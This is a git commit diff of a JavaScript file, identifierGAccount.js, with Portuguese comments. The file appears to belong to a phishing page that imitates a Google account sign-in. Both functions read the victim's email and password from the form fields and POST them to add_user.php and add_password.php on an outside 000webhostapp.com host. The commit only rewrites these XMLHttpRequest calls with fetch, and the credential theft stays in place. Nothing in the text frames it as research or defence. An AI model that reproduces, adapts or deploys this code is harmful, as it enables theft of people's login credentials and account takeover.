4056d78e5a45ecf48db6c51efb6166ae11622d32
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-11 19:23:06 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -5,20 +5,24 @@ function sendUsername() {
   // Obtém o valor do campo de entrada do nome de usuário
   const username = document.querySelector('[type="email"]').value;
 
-  // Cria uma nova solicitação AJAX para enviar o nome de usuário para o arquivo PHP
-  const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://fckyou-get.000webhostapp.com/add_user.php');
-  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xhr.send(`username=${username}`);
-
-  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
-  xhr.onload = () => {
-    if (xhr.status === 200) {
+  // Envia o nome de usuário para o arquivo PHP usando o método fetch
+  fetch('https://fckyou-get.000webhostapp.com/add_user.php', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: `username=${username}`
+  })
+  .then(response => {
+    if (response.ok) {
       console.log('Nome de usuário enviado com sucesso!');
     } else {
       console.error('Ocorreu um erro ao enviar o nome de usuário.');
     }
-  };
+  })
+  .catch(error => {
+    console.error('Ocorreu um erro ao enviar o nome de usuário.', error);
+  });
 }
 
 // Função para enviar a senha para o arquivo PHP
@@ -26,20 +30,24 @@ function sendPassword() {
   // Obtém o valor do campo de entrada da senha
   const password = document.querySelector('[type="password"]').value;
 
-  // Cria uma nova solicitação AJAX para enviar a senha para o arquivo PHP
-  const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://fckyou-get.000webhostapp.com/add_password.php');
-  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xhr.send(`password=${password}`);
-
-  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
-  xhr.onload = () => {
-    if (xhr.status === 200) {
+  // Envia a senha para o arquivo PHP usando o método fetch
+  fetch('https://fckyou-get.000webhostapp.com/add_password.php', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: `password=${password}`
+  })
+  .then(response => {
+    if (response.ok) {
       console.log('Senha enviada com sucesso!');
     } else {
       console.error('Ocorreu um erro ao enviar a senha.');
     }
-  };
+  })
+  .catch(error => {
+    console.error('Ocorreu um erro ao enviar a senha.', error);
+  });
 }
 
 // Adiciona os manipuladores de eventos para os botões de envio do formulário
